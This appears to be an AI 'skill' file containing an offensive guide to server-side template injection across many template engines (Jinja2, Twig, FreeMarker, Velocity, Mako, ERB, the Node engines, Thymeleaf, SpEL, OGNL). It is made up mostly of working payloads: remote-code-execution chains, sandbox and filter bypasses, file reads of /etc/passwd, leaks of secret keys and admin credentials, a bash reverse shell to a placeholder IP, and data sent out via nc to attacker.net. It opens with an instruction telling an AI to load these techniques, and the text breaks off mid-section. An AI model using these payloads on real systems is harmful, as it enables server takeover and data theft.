---
name: ssti
description: Server-Side Template Injection (SSTI) — detection, engine fingerprinting, per-engine RCE chains, blind SSTI, WAF bypass, and exploitation methodology for Jinja2, Twig, Freemarker, Velocity, Mako, ERB, Smarty, Handlebars, Pug, Thymeleaf, SpEL, OGNL, Razor, and more.
---

# Server-Side Template Injection — THE COMPLETE GUIDE

> **AI LOAD INSTRUCTION**: Expert SSTI techniques. Covers polyglot detection probes, engine fingerprinting, Jinja2/FreeMarker/Twig/ERB RCE chains, client-side Angular SSTI, and bypass techniques. Base models often miss sandbox escape MRO chains and non-Jinja2 engines. For PHP CMS template eval, Jira SSTI, Confluence OGNL, and Spring Cloud Gateway SpEL, load the companion `SCENARIOS.md`.

---

## 0. RELATED ROUTING

- First use the polyglot probe sequence at the top of this file for low-noise fingerprinting.
- Load `expression-language-injection` when `${7*7}` or `%{7*7}` resolves in Java (SpEL/OGNL) — different attack surface from template engines.
- Also load `SCENARIOS.md` when you need: Maccms 8.x PHP template `eval`, Jira CVE-2019-11581, Spring Cloud Gateway SpEL (CVE-2022-22947), Struts2 OGNL S2-045, Confluence OGNL CVE-2021-26084, SSTI vs EL disambiguation, additional engines (Razor, EEx, PHP stacks, JS template engines), universal polyglot probe, mathematical fingerprinting, blind SSTI (boolean/time/OOB), and Flask PIN calculation.

---

## 1. DETECTION — POLYGLOT PROBE SEQUENCE

### 1.1 Distinguish SSTI from XSS

Send these probes and check if **math is evaluated** server-side:

```
{{7*7}}        → IF returns 49 (not {{7*7}}) → Jinja2 or Twig
${7*7}         → IF returns 49 → FreeMarker, Velocity, or Java EL
#{7*7}         → Ruby (ERB interpolation in strings)
< x=7*7>${x}  → FreeMarker
@{7*7}         → Thymeleaf
*{7*7}         → Thymeleaf SpEL (*{...})
<%= 7*7 %>     → ERB (Ruby) or EJS (Node.js)
@(7*7)         → Razor (.NET)
{7*7}          → Smarty (older)
${{7*7}}       → Angular (client-side) or some custom engines
```

### 1.2 Jinja2 vs Twig disambiguation

```
{{7*'7'}}
→ 7777777  = Jinja2 (Python string multiplication)
→ 49       = Twig (PHP numeric coercion)
```

### 1.3 Safe detection probe (no math)

```
{{''.__class__}}   → class 'str' = Python/Jinja2
```

### 1.4 Universal polyglot

Triggers errors or evaluation in many engines at once:

```
${{<%[%'\"}}%\.
```

### 1.5 Context-aware detection

- **Plaintext context**: User input is placed directly in template text (e.g., `Dear {{ name }}`). Inject `{{7*7}}` — if response shows `49`, SSTI confirmed.
- **Code context**: User input is placed where template syntax is expected (e.g., `?greeting=data.username}}`). Test by appending template syntax after the input point. If `greeting=data.username}}<tag>` causes an error or `<tag>` appears in output, you broke out of the template → SSTI confirmed.
- **Code context is more dangerous**: Often invisible to developers, harder to detect, and frequently missed in code review.

### 1.6 Detection signals

- Math evaluation (`49` from `7*7`).
- Error messages naming the engine (`jinja2.exceptions.TemplateSyntaxError`, `freemarker.core.ParseException`, `Twig_Error_Syntax`, `org.apache.velocity.exception.ParseErrorException`).
- Stack traces with engine class names.
- Absence of payload in reflection (server consumed it).
- Parts of payload missing (server processed it differently than literal data).

---

## 2. ENGINE-TO-LANGUAGE MAPPING

| Template Engine | Language | Framework | Delimiters |
|---|---|---|---|
| Jinja2 | Python | Flask, FastAPI, Django | `{{ }}`, `{% %}` |
| Django Templates | Python | Django | `{{ }}`, `{% %}` |
| Mako | Python | Pyramid, Pylons | `${ }`, `<% %>` |
| Tornado | Python | Tornado | `{{ }}`, `{% %}` |
| Chameleon | Python | Pyramid | `${ }` |
| Cheetah | Python | Webware | `${ }` |
| Twig | PHP | Symfony, Laravel | `{{ }}`, `{% %}` |
| Smarty | PHP | Various | `{ }` |
| Blade | PHP | Laravel | `{{ }}`, `{!! !!}` |
| Latte | PHP | Nette | `{ }` |
| FreeMarker | Java | Spring MVC | `${ }`, `#{ }` |
| Velocity | Java | Various | `$var`, `#set()` |
| Pebble | Java | Various | `{{ }}` |
| Thymeleaf | Java | Spring Boot | `[[ ]]`, `${ }` |
| Jinjava | Java | HubSpot | `{{ }}` |
| Groovy | Java | Grails | `${ }` |
| ERB | Ruby | Rails | `<%= %>` |
| Slim | Ruby | Rails | `#{ }` |
| Haml | Ruby | Rails | `#{ }` |
| Liquid | Ruby | Shopify | `{{ }}` |
| Pug/Jade | Node.js | Express | `#{ }`, `: ` |
| Handlebars | Node.js | Express | `{{ }}`, `{{{ }}}` |
| EJS | Node.js | Express | `<% %>` |
| Nunjucks | Node.js | Express | `{{ }}` |
| Lodash | Node.js | Various | `{{= }}` |
| Razor | .NET | ASP.NET | `@()`, `{{ }}` |
| Go html/template | Go | net/http | `{{ }}` |

### 2.1 Engine fingerprinting decision tree

```
Input: {{7*7}}
├── Output: 49 → Jinja2, Twig, Nunjucks, or Handlebars
│   └── Test: {{7*'7'}}
│       ├── 7777777 → Jinja2 (Python)
│       └── 49      → Twig (PHP) or Nunjucks (Node.js)
│           └── Test: {{_self}} or {{config}}
│               ├── Works → Twig
│               └── Error → Nunjucks
├── Output: 7777777 → Jinja2 or Mako
│   └── Test: {{''.__class__}} → class 'str' = Jinja2
└── Output: literal → try ${7*7}
    ├── 49 → FreeMarker, Velocity, or Java EL
    │   └── Test: ${"a"?upper_case}
    │       ├── A → FreeMarker
    │       └── Error → Velocity or Java EL
    └── literal → try <%= 7*7 %>
        ├── 49 → ERB (Ruby) or EJS (Node.js)
        └── literal → try #{7*7}
            ├── 49 → Pug/Slim or Ruby interpolation
            └── literal → likely not SSTI (check XSS)
```

---

## 3. JINJA2 (PYTHON / FLASK) — RCE CHAINS

### 3.1 Detection

- `{{7*'7'}}` returns `7777777`.
- Stack traces mention `jinja2.exceptions`.
- Jinja2 is the default template engine in Flask.

### 3.2 Basic info disclosure

```python
{{config}}                    # Dump Flask config (SECRET_KEY, DB URIs)
{{config.items()}}            # Iterate config
{{self}}                      # Template reference object
{{request.application}}       # Request object
{{request.environ}}           # Full WSGI environ (headers, paths)
{{request.application.__globals__}}  # Global namespace
{{lipsum.__globals__}}        # lipsum function globals
{{cycler.__init__.__globals__}}  # cycler class globals
{{namespace.__init__.__globals__}}  # namespace class globals
{{joiner.__init__.__globals__}}  # joiner class globals
{% debug %}                   # Dump context, filters, tests (if debug ext)
```

### 3.3 Dump all used classes

```python
{{ [].__class__.__base__.__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{ self.__init__.__globals__.__builtins__ }}
```

### 3.4 RCE Chain 1: `os` module via `__globals__` (context-free)

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
{{ config.__class__.from_envvar.__globals__['os'].popen('ls').read() }}
{{ config.__class__.from_envvar.__globals__.import_string('os').popen('ls').read() }}
```

### 3.5 RCE Chain 2: MRO subclass traversal (sandbox escape)

```python
# List all subclasses:
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Find subprocess.Popen index (varies by Python version, usually 258-270):
# Look for "subprocess.Popen" in the list

# Execute command (replace [258] with correct index):
{{ ''.__class__.__mro__[1].__subclasses__()[258]('id', shell=True, stdout=-1).communicate()[0] }}

# Alternative: search for Popen dynamically:
{% for c in ().__class__.__base__.__subclasses__() %}
  {% if "Popen" in c.__name__ %}
    {{ c('id', shell=True, stdout=-1).communicate()[0] }}
  {% endif %}
{% endfor %}
```

### 3.6 RCE Chain 3: Flask built-in globals (shortest payloads)

```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
```

### 3.7 RCE Chain 4: `request` object with hex encoding (bypass `_` filter)

```python
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')() }}
```

### 3.8 RCE Chain 5: Without guessing subclass offset

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("id").read()}}{%endif%}{% endfor %}
```

### 3.9 RCE Chain 6: Evil config file write

```python
# Write evil config:
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# Load the evil config:
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}

# Execute:
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"', shell=True) }}
```

### 3.10 RCE Chain 7: Forcing output on blind RCE (Flask)

```python
{{ x.__init__.__builtins__.exec("from flask import current_app, after_this_request
@after_this_request
def hook(*args, **kwargs):
    from flask import make_response
    r = make_response('Powned')
    return r
") }}
```

### 3.11 File read/write

```python
# Read file:
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}

# Write file:
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/hello.txt', 'w').write('Hello!') }}

# Read remote file:
{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}
```

### 3.12 Obfuscation: index-position string building

```python
# Build "id" from string index positions (index values vary by target):
{{ self.__init__.__globals__.__str__()[1786:1788] }}

# Execute using built string:
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read() }}
```

---

## 4. JINJA2 SANDBOX BYPASS TECHNIQUES

### 4.1 Bypassing `_` (underscore) filter

```python
# Use attr filter with hex encoding:
''|attr('\x5f\x5fclass\x5f\x5f')

# Use getattr via request object:
request|attr('args')|attr('__class__')
```

### 4.2 Bypassing `.` (dot) operator

```python
# Use [] subscript notation:
''['__class__']
config['SECRET_KEY']
request['application']
```

### 4.3 Bypassing keywords (class, mro, base)

```python
|attr('\x5f\x5fclass\x5f\x5f')
|attr('\x5f\x5fm\x72\x6F\x5f\x5f')
|attr('\x5f\x5fbase\x5f\x5f')
```

### 4.4 Bypassing `[` and `]`

```python
# Use tuple instead of list:
{{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_

# Or:
{{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
```

### 4.5 Bypassing `|join`

```python
{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```

### 4.6 Bypassing most common filters ('.','_','|join','[',']','mro','base')

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

### 4.7 Bypassing HTML encoding

```python
{{'<script>alert(1)</script>'|safe}}
```

---

## 5. TWIG (PHP) — RCE

### 5.1 Detection

- `{{7*7}}` → `49`
- `{{7*'7'}}` → `49` (PHP numeric coercion, vs Jinja2's `7777777`)
- Stack traces mention `Twig_Error_Syntax`.
- Twig is used by Symfony and Laravel.

### 5.2 Basic info disclosure

```php
{{_self}}
{{_self.env}}
{{dump(app)}}
{{dump(_context)}}
{{app.request.server.all|join(',')}}
{{_self.env.getExtensions()}}
```

### 5.3 File read

```php
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{include("wp-config.php")}}
```

### 5.4 RCE — Twig 1.x (before sandbox)

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("whoami")}}
```

### 5.5 RCE — Twig 1.x/2.x via filter map

```php
{{['id']|filter('system')}}
{{['id']|map('system')|join}}
{{['id',1]|sort('system')|join}}
{{['cat /etc/passwd']|filter('system')}}
{{['id']|filter('passthru')}}
{{['id']|map('passthru')}}
{{['nslookup oastify.com']|filter('system')}}
```

### 5.6 RCE — Twig 2.x+ via call_user_func

```php
{{ {'id':'shell_exec'}|map('call_user_func')|join }}
{{ ['xx', {"id": "shell_exec"}|map("call_user_func")|join]|join }}
```

### 5.7 RCE — Twig 3.x via reduce

```php
{{[0]|reduce('system','id')}}
```

### 5.8 RCE — Error-based (Twig <= 1.19)

```php
{% for a in ["error_reporting", "1"]|sort("ini_set") %}{% endfor %}
{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{%include ["Y:/A:/", _self.env.getFilter("id")]|join%}
```

### 5.9 RCE — Boolean-based (Twig <= 1.19)

```php
{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{1/(_self.env.getFilter("id && echo UniqueString")|trim('\n') ends with "UniqueString")}}
```

### 5.10 RCE — Sandbox bypass (CVE-2022-23614)

```php
{{ 1 / (["id >>/dev/null && echo -n 1", "0"]|sort("system")|first == "0") }}
```

### 5.11 RCE — Obfuscation via block + _charset

```php
{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
```

### 5.12 RCE — Double-rendering context bypass

```php
{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}
```

### 5.13 RCE — Email FILTER_VALIDATE_EMAIL bypass

```powershell
POST /subscribe?0=cat+/etc/passwd HTTP/1.1
email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
```

---

## 6. FREEMARKER (JAVA) — RCE

### 6.1 Detection

- `${7*7}` → `49`
- Stack traces mention `freemarker.core.ParseException`.
- Alternative delimiters: `#{3*3}`, `[=3*3]` (since 2.3.4).

### 6.2 Basic info disclosure

```freemarker
${product}
${.data_model}
${_TemplateModel_from_import_*}
${.vars}
${.main_template_name}
```

### 6.3 Read file

```freemarker
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

### 6.4 RCE — Execute via freemarker.template.utility.Execute

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

[#assign ex = 'freemarker.template.utility.Execute'?new()]
${ ex('id')}

${"freemarker.template.utility.Execute"?new()("id")}
#{"freemarker.template.utility.Execute"?new()("id")}
[="freemarker.template.utility.Execute"?new()("id")]
```

### 6.5 RCE — ObjectConstructor alternative

```freemarker
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
<#assign br=ob("java.io.BufferedReader",ob("java.io.InputStreamReader",ob("java.lang.Runtime")?api.exec("id").inputStream))>
${br.readLine()}
```

### 6.6 RCE — Obfuscation via lower_abc

```freemarker
${(6?lower_abc+18?lower_abc+5?lower_abc+5?lower_abc+13?lower_abc+1?lower_abc+18?lower_abc+11?lower_abc+5?lower_abc+18?lower_abc+1.1?c[1]+20?lower_abc+5?lower_abc+13?lower_abc+16?lower_abc+12?lower_abc+1?lower_abc+20?lower_abc+5?lower_abc+1.1?c[1]+21?lower_abc+20?lower_abc+9?lower_abc+12?lower_abc+9?lower_abc+20?lower_abc+25?lower_abc+1.1?c[1]+5?upper_abc+24?lower_abc+5?lower_abc+3?lower_abc+21?lower_abc+20?lower_abc+5?lower_abc)?new()(9?lower_abc+4?lower_abc)}
```

### 6.7 Blind RCE variants

```freemarker
${("xx"+("freemarker.template.utility.Execute"?new()("id")))?new()}  # Error-Based
${1/((freemarker.template.utility.Execute"?new()("id && echo UniqueString")?chop_linebreak?ends_with("UniqueString"))?string('1','0')?eval)}  # Boolean-Based
${"freemarker.template.utility.Execute"?new()("id && sleep 5")}  # Time-Based
```

### 6.8 Sandbox bypass (Freemarker < 2.3.30)

```freemarker
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

---

## 7. VELOCITY (JAVA) — RCE

### 7.1 Detection

- `${7*7}` → `49`
- `#set($x=7*7)$x` → `49`
- Stack traces mention `org.apache.velocity.exception.ParseErrorException`.

### 7.2 Basic info

```velocity
$sysclass
$context
$class
$knownContextObject
```

### 7.3 RCE — Direct Runtime exec

```velocity
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

### 7.4 RCE — Base64 command execution

```velocity
#set($base64EncodedCommand = 'd2hvYW1p')
#set($contextObjectClass = $knownContextObject.getClass())
#set($Base64Class = $contextObjectClass.forName("java.util.Base64"))
#set($Base64Decoder = $Base64Class.getMethod("getDecoder").invoke(null))
#set($decodedBytes = $Base64Decoder.decode($base64EncodedCommand))
#set($StringClass = $contextObjectClass.forName("java.lang.String"))
#set($command = $StringClass.getConstructor($contextObjectClass.forName("[B"), $contextObjectClass.forName("java.lang.String")).newInstance($decodedBytes, "UTF-8"))
#set($commandArgs = ["/bin/sh", "-c", $command])
#set($ProcessBuilderClass = $contextObjectClass.forName("java.lang.ProcessBuilder"))
#set($processBuilder = $ProcessBuilderClass.getConstructor($contextObjectClass.forName("java.util.List")).newInstance($commandArgs))
#set($processBuilder = $processBuilder.redirectErrorStream(true))
#set($process = $processBuilder.start())
#set($exitCode = $process.waitFor())
#set($inputStream = $process.getInputStream())
#set($ScannerClass = $contextObjectClass.forName("java.util.Scanner"))
#set($scanner = $ScannerClass.getConstructor($contextObjectClass.forName("java.io.InputStream")).newInstance($inputStream))
#set($scannerDelimiter = $scanner.useDelimiter("\\A"))
#if($scanner.hasNext())
  #set($output = $scanner.next().trim())
  $output.replaceAll("\\s+$", "").replaceAll("^\\s+", "")
#end
```

### 7.5 Blind RCE variants

```velocity
# Error-Based:
#set($s="")
#set($sc=$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()))
#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id")
#set($n=$p.waitFor())
#set($b="Y:/A:/"+$sc.newInstance($p.inputStream.readAllBytes(), "UTF-8"))
#include($b)

# Boolean-Based:
#set($s="")
#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
#set($n=$p.waitFor())
#set($r=$p.exitValue())
#if($r != 0)
#include("Y:/A:/xxx")
#end

# Time-Based:
#set($s="")
#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
#set($n=$p.waitFor())
#set($r=$p.exitValue())
#if($r != 0)
#set($t=$s.getClass().forName("java.lang.Thread").sleep(5000))
#end
```

---

## 8. MAVEN / MAKO (PYTHON) — RCE

### 8.1 Detection

- `${7*7}` → `49`
- Error messages mention `mako.exceptions`.
- Mako is used by Pyramid and Pylons.

### 8.2 RCE — Direct os access

```python
<%
import os
x=os.popen('id').read()
%>
${x}

${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.module.cache.compat.inspect.os.system("id")}
${self.__init__.__globals__['util'].os.system('id')}
${self.template.module.runtime.util.os.system("id")}
${self.module.filters.compat.inspect.os.system("id")}
${self.module.runtime.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.util.os.system("id")}
${self.template._mmarker.module.cache.util.os.system("id")}
${self.template.module.cache.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
${self.template.module.filters.compat.inspect.os.system("id")}
${self.template.module.runtime.compat.inspect.os.system("id")}
${self.module.filters.compat.inspect.linecache.os.system("id")}
${self.module.runtime.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.exceptions.util.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
${self.context._with_template.module.cache.util.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.template.module.cache.util.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.util.os.system("id")}
${self.module.cache.util.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
${self.template.module.cache.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
${self.template.module.filters.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
${self.context._with_template._mmarker.module.cache.util.os.system("id")}
${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.cache.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
${self.context._with_template.module.filters.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
```

### 8.3 RCE — Obfuscation via chr

```python
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}
<%import os%>${os.popen(str().join(chr(i)for(i)in[105,100])).read()}
```

---

## 9. TORNADO (PYTHON) — RCE

### 9.1 Detection

- `{{7*7}}` → `49`
- `{{7*'7'}}` → `7777777`
- `{{handler.settings}}` → reflects Tornado app settings (cookie_secret).

### 9.2 RCE

```python
{{os.system('whoami')}}
{%import os%}{{os.system('nslookup oastify.com')}}
```

---

## 10. DJANGO TEMPLATES (PYTHON) — RCE

### 10.1 Detection

- `{{7*7}}` → error (Django Templates doesn't evaluate math by default)
- `ih0vr{{364|add:733}}d121r` → `ih0vr1097d121r` (uses `add` filter)
- `{% csrf_token %}` → error with Jinja2 (disambiguator)

### 10.2 Info disclosure

```python
{% debug %}                              # Dump context, filters, tests
{{ messages.storages.0.signer.key }}     # Leak SECRET_KEY
{% include 'admin/base.html' %}          # Leak admin URL
{% get_admin_log 10 as log %}{% for e in log %}{{e.user.get_username}} : {{e.user.password}}{% endfor %}  # Leak admin creds
```

---

## 11. ERB (RUBY RAILS) — RCE

### 11.1 Detection

- `<%= 7*7 %>` → `49`
- `#{7*7}` → `49` (Ruby string interpolation)
- Stack traces mention `erb`.

### 11.2 RCE

```ruby
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= File.read('/etc/passwd') %>
<%= Dir.entries('/') %>
<%= `nslookup oastify.com` %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```

### 11.3 Slim engine

```ruby
#{ 7 * 7 }
#{ %x|env| }
```

### 11.4 Universal Ruby payloads

```ruby
%x('id')                              # Rendered RCE
File.read("Y:/A:/"+%x('id'))          # Error-Based RCE
1/(system("id")&&1||0)                # Boolean-Based RCE
system("id && sleep 5")               # Time-Based RCE
```

---

## 12. JAVASCRIPT TEMPLATE ENGINES — RCE

### 12.1 Handlebars

#### Detection

- `{{7*7}}` → `49`
- `{{this}}` → reveals object context

#### RCE (versions < 4.1.2, < 4.0.14, < 3.0.7 — GHSA-q42p-pg8m-cqh6)

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### 12.2 Pug/Jade

```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')

#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

### 12.3 EJS

```javascript
<%= global.process.mainModule.require("child_process").execSync("id").toString() %>
<%- global.process.mainModule.require("child_process").execSync("id").toString() %>
```

### 12.4 Lodash

```javascript
{{= _.VERSION}}
{{= _.templateSettings.evaluate }}

{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
```

### 12.5 Nunjucks

```javascript
{{range.constructor('return process.mainModule.require("child_process").execSync("id").toString()')()}}
```

### 12.6 Universal Node.js payloads

```javascript
// Rendered RCE:
global.process.mainModule.require("child_process").execSync("id").toString()

// Error-Based RCE:
global.process.mainModule.require("Y:/A:/"+global.process.mainModule.require("child_process").execSync("id").toString())
""["x"][global.process.mainModule.require("child_process").execSync("id").toString()]

// Boolean-Based RCE:
[""][0 + !(global.process.mainModule.require("child_process").spawnSync("id", options={shell:true}).status===0)]["length"]

// Time-Based RCE:
global.process.mainModule.require("child_process").execSync("id && sleep 5").toString()
```

---

## 13. THYMELEAF (JAVA SPRING) — RCE

### 13.1 Detection

- `${7*7}` → `49`
- `[[${7*7}]]` → `49` (expression inlining)
- `#{7*7}` → `49` (selection expressions)
- Stack traces mention `org.thymeleaf`.

### 13.2 RCE — SpringEL

```java
${T(java.lang.Runtime).getRuntime().exec("calc")}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","id"}).getInputStream())}
```

### 13.3 RCE — OGNL

```java
${ = @java.lang.Runtime@getRuntime(),.exec("calc")}
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}
```

### 13.4 RCE — Expression preprocessing

```java
#{selection.__${sel.code}__}
__${T(java.lang.Runtime).getRuntime().exec("id")}__::type
```

---

## 14. SPRING EXPRESSION LANGUAGE (SpEL) — RCE

### 14.1 Detection

- `${7*7}` → `49`
- `#{7*7}` → `49`
- `*{7*7}` → `49`
- Stack traces mention `SpEL` or `EvaluationException`.

### 14.2 Info disclosure

```java
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
```

### 14.3 RCE — Runtime.exec

```java
${T(java.lang.Runtime).getRuntime().exec("whoami")}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

### 14.4 RCE — ProcessBuilder

```java
${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
${request.getAttribute("c").add("cmd.exe")}
${request.getAttribute("c").add("/k")}
${request.getAttribute("c").add("whoami")}
${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
${request.getAttribute("a")}
```

### 14.5 RCE — ScriptEngineManager

```java
${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\"whoami\")")}
```

### 14.6 Blind RCE variants

```java
${T(java.lang.Integer).valueOf("x"+T(java.lang.String).getConstructor(T(byte[])).newInstance(T(java.lang.Runtime).getRuntime().exec("id").inputStream.readAllBytes()))}  # Error-Based
${1/((T(java.lang.Runtime).getRuntime().exec("id").waitFor()==0)?1:0)+""}  # Boolean-Based
${(T(java.lang.Runtime).getRuntime().exec("id").waitFor().equals(0)?T(java.lang.Thread).sleep(5000):0).toString()}  # Time-Based
```

---

## 15. OGNL (JAVA STRUTS2) — RCE

### 15.1 Detection

- `${7*7}` → `49`
- `%{7*7}` → `49`
- Stack traces mention `OGNL` or `commons-ognl`.

### 15.2 RCE

```java
# Rendered:
new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes())

# Error-Based:
(new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes()))/0

# Boolean-Based:
